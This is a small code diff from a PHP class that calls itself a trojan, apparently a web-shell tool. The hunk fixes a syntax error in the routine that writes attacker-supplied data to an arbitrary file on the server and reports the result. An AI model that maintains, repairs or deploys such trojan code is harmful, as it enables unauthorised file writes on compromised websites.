@@ -208,10 +208,10 @@ class Trojan{
         # Attempt to write the file, and notify the user of the result. Again,
         # I'm combining several error checks here just to keep the trojan small.
         if(file_put_contents($args['file'], $args['data']) === false){
-            $this->response['error'] = 'Failed to write file. It may not be writable, or may not exist.',
+            $this->response['error'] = 'Failed to write file. It may not be writable, or may not exist.';
         }
         else {
-            $this->response['output'] = 'File written successfully.',
+            $this->response['output'] = 'File written successfully.';
         }
         $this->response['prompt_context'] = $this->prompt_context;
         $this->send_response();
